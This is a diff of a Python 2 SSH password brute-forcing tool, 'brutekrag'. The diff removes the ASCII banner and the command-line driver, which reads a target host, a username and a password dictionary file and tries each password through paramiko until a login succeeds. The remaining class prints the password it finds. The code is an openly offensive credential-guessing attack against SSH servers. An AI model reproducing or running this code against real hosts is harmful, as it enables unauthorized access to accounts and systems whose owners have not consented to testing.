@@ -25,16 +25,6 @@ import sys
 import paramiko
 from paramiko import AutoAddPolicy
 
-banner = ('''\033[92m      _                _       _
-     | |              | |     | |
-     | |__  _ __ _   _| |_ ___| | ___ __ __ _  __ _
-     | '_ \| '__| | | | __/ _ \ |/ / '__/ _` |/ _` |
-     | |_) | |  | |_| | ||  __/   <| | | (_| | (_| |
-     |_.__/|_|   \__,_|\__\___|_|\_\_|  \__,_|\__, |
-             \033[0m\033[1mOpenSSH Brute forcer tool 0.1\033[92m     __/ |
-          \033[0m(c) Copyright 2014 Jorge Matricali\033[92m  |___/\033[0m
-          \n''')
-
 
 class brutekrag:
     def __init__(self, host, port=22):
@@ -66,33 +56,3 @@ class brutekrag:
 
         print 'The password for user \033[1m%s\033[0m is \033[1m%s\033[0m' % (username, password)
         return 0
-
-
-if __name__ == '__main__':
-    import argparse
-    from argparse import RawTextHelpFormatter
-
-    parser = argparse.ArgumentParser(description=banner,
-                                     formatter_class=RawTextHelpFormatter)
-
-    parser.add_argument('hostname', type=str, help='Target hostname or IPv4')
-    parser.add_argument('username', type=str, help='Target username')
-    parser.add_argument('dictionary', type=str, help='Path to password dictionary file. One password per line.')
-    parser.add_argument('-p', '--port', type=int, help='Target port (default 22)', default=22)
-
-    try:
-        args = parser.parse_args()
-    except TypeError:
-        parser.print_help()
-        parser.exit()
-
-    btkg = brutekrag(args.hostname, args.port)
-    with open(args.dictionary, 'r') as dictionary:
-        for password in dictionary:
-            try:
-                if btkg.connect(args.username, password.strip()) == 0:
-                    break
-            except paramiko.ssh_exception.SSHException as error:
-                print 'An error occured:', error.message
-                continue
-        dictionary.close()
